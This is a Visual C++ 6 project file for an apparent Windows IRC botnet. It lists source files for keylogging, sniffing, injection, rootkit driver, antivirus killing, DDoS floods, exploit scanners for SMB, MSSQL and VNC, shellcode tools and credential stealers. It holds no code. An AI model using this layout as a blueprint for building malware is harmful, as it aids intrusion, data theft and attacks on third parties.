# Microsoft Developer Studio Project File - Name="bot" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=BOT - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "bot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "bot.mak" CFG="BOT - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "bot - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "bin32"
# PROP BASE Intermediate_Dir "temp"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "bin32"
# PROP Intermediate_Dir "temp"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /G6 /W3 /GX /Ot /Og /Oi /Oy /Ob2 /Gy /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /Gs /c
# ADD CPP /nologo /G6 /W3 /GX /Ot /Og /Oi /Oy /Ob2 /Gy /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /Gs /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /machine:I386
# ADD LINK32 /nologo /subsystem:windows /machine:I386
# Begin Target

# Name "bot - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "Bot Source"

# PROP Default_Filter ""
# Begin Group "Install Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\bot\install\install_bot.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\install\install_driver.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\install\install_wormride.cpp
# End Source File
# End Group
# Begin Group "Protocol Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\bot\protocol\irc.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\protocol\irc_parser.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\source\bot\antidebug.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\bot.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\dcc.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\debug.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\file.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\ftp.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\globals.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\http.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\info.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\inject.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\keylog.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\logic.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\misc.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\netutils.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\patch.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\persist.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\process.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\psniff.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\registry.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\ring0.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\secure.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\service.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\speedtest.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\thread.cpp
# End Source File
# Begin Source File

SOURCE=.\source\bot\userctrl.cpp
# End Source File
# End Group
# Begin Group "Crypto Soruce"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\crypto\crypto.cpp
# End Source File
# Begin Source File

SOURCE=.\source\crypto\rc4.cpp
# End Source File
# Begin Source File

SOURCE=.\source\crypto\sha256.cpp
# End Source File
# End Group
# Begin Group "Daemon Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\daemon\daemon_ftp.cpp
# End Source File
# Begin Source File

SOURCE=.\source\daemon\daemon_http.cpp
# End Source File
# Begin Source File

SOURCE=.\source\daemon\daemon_ident.cpp
# End Source File
# Begin Source File

SOURCE=.\source\daemon\daemon_socks4.cpp
# End Source File
# End Group
# Begin Group "DDOS Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\ddos\bandwithflood.cpp
# End Source File
# Begin Source File

SOURCE=.\source\ddos\synackflood.cpp
# End Source File
# Begin Source File

SOURCE=.\source\ddos\trollflood.cpp
# End Source File
# Begin Source File

SOURCE=.\source\ddos\udpflood.cpp
# End Source File
# End Group
# Begin Group "Killer Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\killer\avkiller.cpp
# End Source File
# Begin Source File

SOURCE=.\source\killer\botkiller.cpp
# End Source File
# End Group
# Begin Group "Scan Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\scan\expscan.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_asn1.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_ftp.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_myudf.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\expscan_radmin.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_realvnc.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_smb.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_smtp.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\mircscan.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\mssql.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\netapi.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\sym.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\transfer.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\usbscan.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\vncps\d3des.c
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\vncps\vncps.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\wdns.cpp
# End Source File
# Begin Source File

SOURCE=.\source\scan\wordlist.cpp
# End Source File
# End Group
# Begin Group "Shellcode Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\shellcode\shellcode.asm
# End Source File
# Begin Source File

SOURCE=.\source\shellcode\shellcode.cpp
# End Source File
# End Group
# Begin Group "Snag Source"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\snag\snag_cdkeys.cpp
# End Source File
# Begin Source File

SOURCE=.\source\snag\snag_clipboard.cpp
# End Source File
# Begin Source File

SOURCE=.\source\snag\snag_emails.cpp
# End Source File
# Begin Source File

SOURCE=.\source\snag\snag_msn.cpp
# End Source File
# Begin Source File

SOURCE=.\source\snag\snag_storage.cpp
# End Source File
# End Group
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "Bot Headers"

# PROP Default_Filter ""
# Begin Group "Install Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\bot\install\install_bot.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\install\install_driver.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\install\install_wormride.h
# End Source File
# End Group
# Begin Group "Protocol Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\bot\protocol\irc.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\protocol\irc_parser.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\source\bot\antidebug.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\bot.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\dcc.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\debug.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\file.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\ftp.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\globals.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\http.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\info.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\inject.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\keylog.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\logic.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\misc.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\netutils.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\patch.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\persist.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\process.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\psniff.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\registry.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\ring0.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\secure.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\service.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\speedtest.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\thread.h
# End Source File
# Begin Source File

SOURCE=.\source\bot\userctrl.h
# End Source File
# End Group
# Begin Group "Crypto Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\crypto\crypto.h
# End Source File
# Begin Source File

SOURCE=.\source\crypto\rc4.h
# End Source File
# Begin Source File

SOURCE=.\source\crypto\sha256.h
# End Source File
# End Group
# Begin Group "Daemon Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\daemon\daemon_ftp.h
# End Source File
# Begin Source File

SOURCE=.\source\daemon\daemon_http.h
# End Source File
# Begin Source File

SOURCE=.\source\daemon\daemon_ident.h
# End Source File
# Begin Source File

SOURCE=.\source\daemon\daemon_socks4.h
# End Source File
# End Group
# Begin Group "DDOS Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\ddos\bandwithflood.h
# End Source File
# Begin Source File

SOURCE=.\source\ddos\synackflood.h
# End Source File
# Begin Source File

SOURCE=.\source\ddos\trollflood.h
# End Source File
# Begin Source File

SOURCE=.\source\ddos\udpflood.h
# End Source File
# End Group
# Begin Group "Killer Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\killer\avkiller.h
# End Source File
# Begin Source File

SOURCE=.\source\killer\botkiller.h
# End Source File
# End Group
# Begin Group "Scan Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\scan\expscan.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_asn1.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_ftp.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_myudf.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_pnp.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\expscan_radmin.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_realvnc.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_smb.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\expscan_smtp.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\mircscan.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\mssql.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\netapi.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\vncps\d3des.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\vncps\rfb.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\vncps\vncps.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\sym.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\transfer.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\usbscan.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\new\wdns.h
# End Source File
# Begin Source File

SOURCE=.\source\scan\wordlist.h
# End Source File
# End Group
# Begin Group "Shellcode Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\shellcode\shellcode.h
# End Source File
# End Group
# Begin Group "Snag Headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\snag\snag_cdkeys.h
# End Source File
# Begin Source File

SOURCE=.\source\snag\snag_clipboard.h
# End Source File
# Begin Source File

SOURCE=.\source\snag\snag_emails.h
# End Source File
# Begin Source File

SOURCE=.\source\snag\snag_msn.h
# End Source File
# Begin Source File

SOURCE=.\source\snag\snag_storage.h
# End Source File
# End Group
# Begin Group "Settings"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\settings\colors.h
# End Source File
# Begin Source File

SOURCE=.\source\settings\commands.h
# End Source File
# Begin Source File

SOURCE=.\source\settings\config.h
# End Source File
# Begin Source File

SOURCE=.\source\settings\defines.h
# End Source File
# Begin Source File

SOURCE=.\source\settings\externs.h
# End Source File
# Begin Source File

SOURCE=.\source\settings\fake.h
# End Source File
# Begin Source File

SOURCE=.\source\settings\strings.h
# End Source File
# End Group
# End Group
# Begin Group "Driver"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\source\driver\driver.c
# PROP Exclude_From_Build 1
# End Source File
# Begin Source File

SOURCE=.\source\driver\MAKEFILE
# PROP Exclude_From_Build 1
# End Source File
# Begin Source File

SOURCE=.\source\driver\SOURCES
# PROP Exclude_From_Build 1
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\source\resource.rc
# End Source File
# End Group
# Begin Group "Documents"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\documents\bugs.txt
# End Source File
# Begin Source File

SOURCE=.\documents\changes.txt
# End Source File
# Begin Source File

SOURCE=.\documents\faq.txt
# End Source File
# Begin Source File

SOURCE=.\documents\todo.txt
# End Source File
# End Group
# Begin Group "Tools"

# PROP Default_Filter ""
# Begin Group "Other"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\tools\other\crypto.exe
# End Source File
# Begin Source File

SOURCE=.\tools\other\hexdump.exe
# End Source File
# Begin Source File

SOURCE=.\tools\other\inject.exe
# End Source File
# Begin Source File

SOURCE=.\tools\other\loader.exe
# End Source File
# Begin Source File

SOURCE=.\tools\other\service.exe
# End Source File
# End Group
# Begin Group "Shellcode"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\tools\shellcode\arwin.exe
# End Source File
# Begin Source File

SOURCE=.\tools\shellcode\encoder.exe
# End Source File
# Begin Source File

SOURCE=.\tools\shellcode\findjmp.exe
# End Source File
# Begin Source File

SOURCE=.\tools\shellcode\hash.exe
# End Source File
# Begin Source File

SOURCE=.\tools\shellcode\makeshell.exe
# End Source File
# Begin Source File

SOURCE=.\tools\shellcode\nasmw.exe
# End Source File
# End Group
# End Group
# Begin Source File

SOURCE=.\source\libraries\pstorec.dll
# End Source File
# End Target
# End Project
